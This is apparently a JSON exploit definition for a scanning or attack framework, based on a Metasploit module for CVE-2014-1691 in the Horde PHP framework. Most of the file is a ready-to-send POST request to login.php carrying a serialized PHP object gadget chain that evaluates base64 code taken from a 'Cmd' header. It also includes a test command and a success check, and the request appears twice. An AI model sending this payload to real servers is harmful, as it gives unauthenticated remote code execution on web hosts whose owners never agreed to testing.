{
   "platform" : "UNIX",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n        This module exploits a php unserialize() vulnerability in Horde <= 5.1.1 which could be\n\n        abused to allow unauthenticated users to execute arbitrary code with the permissions of\n\n        the web server. The dangerous unserialize() exists in the 'lib/Horde/Variables.php' file.\n\n        The exploit abuses the __destruct() method from the Horde_Kolab_Server_Decorator_Clean\n\n        class to reach a dangerous call_user_func() call in the Horde_Prefs class.\n\n      ",
   "title" : "Horde Framework Unserialize PHP Code Execution",
   "name" : "HordeUnserializeExec",
   "cve" : "CVE-2014-1691",
   "references" : [
      "http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection",
      "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737149",
      "https://github.com/horde/horde/commit/da6afc7e9f4e290f782eca9dbca794f772caccb3"
   ],
   "msf_module" : "horde_unserialize_exec",
   "requests" : {
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "login.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "HEADERS" : {
            "Cmd" : "cHJpbnQgYVdQa1RBQUNCcmtQenBPV3ZaZ1ZpbllmQUF5aTtkaWU7",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "_formvars=O%3a34%3a%22Horde_Kolab_Server_Decorator_Clean%22%3a2%3a%7bs%3a43%3a%22%00Horde_Kolab_Server_Decorator_Clean%00_server%22%3bO%3a20%3a%22Horde_Prefs_Identity%22%3a2%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3bO%3a11%3a%22Horde_Prefs%22%3a2%3a%7bs%3a8%3a%22%00%2a%00_opts%22%3ba%3a1%3a%7bs%3a12%3a%22sizecallback%22%3ba%3a2%3a%7bi%3a0%3bO%3a12%3a%22Horde_Config%22%3a1%3a%7bs%3a13%3a%22%00%2a%00_oldConfig%22%3bs%3a46%3a%22eval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%28%29%3b%22%3b%7di%3a1%3bs%3a13%3a%22readXMLConfig%22%3b%7d%7ds%3a10%3a%22%00%2a%00_scopes%22%3ba%3a1%3a%7bs%3a5%3a%22horde%22%3bO%3a17%3a%22Horde_Prefs_Scope%22%3a1%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d%7d%7ds%3a13%3a%22%00%2a%00_prefnames%22%3ba%3a1%3a%7bs%3a10%3a%22identities%22%3bi%3a0%3b%7d%7ds%3a42%3a%22%00Horde_Kolab_Server_Decorator_Clean%00_added%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d",
         "TEXT" : "Sending Exploit #1 Request : [POST] /login.php"
      }
   },
   "informations" : {
      "MSF_MODULE" : "horde_unserialize_exec",
      "TITLE" : "Horde Framework Unserialize PHP Code Execution",
      "CVE" : "CVE-2014-1691",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "login.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "HEADERS" : {
               "Cmd" : "cHJpbnQgYVdQa1RBQUNCcmtQenBPV3ZaZ1ZpbllmQUF5aTtkaWU7",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "_formvars=O%3a34%3a%22Horde_Kolab_Server_Decorator_Clean%22%3a2%3a%7bs%3a43%3a%22%00Horde_Kolab_Server_Decorator_Clean%00_server%22%3bO%3a20%3a%22Horde_Prefs_Identity%22%3a2%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3bO%3a11%3a%22Horde_Prefs%22%3a2%3a%7bs%3a8%3a%22%00%2a%00_opts%22%3ba%3a1%3a%7bs%3a12%3a%22sizecallback%22%3ba%3a2%3a%7bi%3a0%3bO%3a12%3a%22Horde_Config%22%3a1%3a%7bs%3a13%3a%22%00%2a%00_oldConfig%22%3bs%3a46%3a%22eval%28base64_decode%28%24_SERVER%5bHTTP_CMD%5d%29%29%3bdie%28%29%3b%22%3b%7di%3a1%3bs%3a13%3a%22readXMLConfig%22%3b%7d%7ds%3a10%3a%22%00%2a%00_scopes%22%3ba%3a1%3a%7bs%3a5%3a%22horde%22%3bO%3a17%3a%22Horde_Prefs_Scope%22%3a1%3a%7bs%3a9%3a%22%00%2a%00_prefs%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d%7d%7ds%3a13%3a%22%00%2a%00_prefnames%22%3ba%3a1%3a%7bs%3a10%3a%22identities%22%3bi%3a0%3b%7d%7ds%3a42%3a%22%00Horde_Kolab_Server_Decorator_Clean%00_added%22%3ba%3a1%3a%7bi%3a0%3bi%3a1%3b%7d%7d",
            "TEXT" : "Sending Exploit #1 Request : [POST] /login.php"
         }
      },
      "name" : "HordeUnserializeExec",
      "DESCRIPTION" : "\n\n        This module exploits a php unserialize() vulnerability in Horde <= 5.1.1 which could be\n\n        abused to allow unauthenticated users to execute arbitrary code with the permissions of\n\n        the web server. The dangerous unserialize() exists in the 'lib/Horde/Variables.php' file.\n\n        The exploit abuses the __destruct() method from the Horde_Kolab_Server_Decorator_Clean\n\n        class to reach a dangerous call_user_func() call in the Horde_Prefs class.\n\n      ",
      "REFERENCES" : [
         "http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection",
         "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737149",
         "https://github.com/horde/horde/commit/da6afc7e9f4e290f782eca9dbca794f772caccb3"
      ],
      "PLATFORM" : "UNIX",
      "TYPE" : "MSF"
   },
   "detection" : {}
}
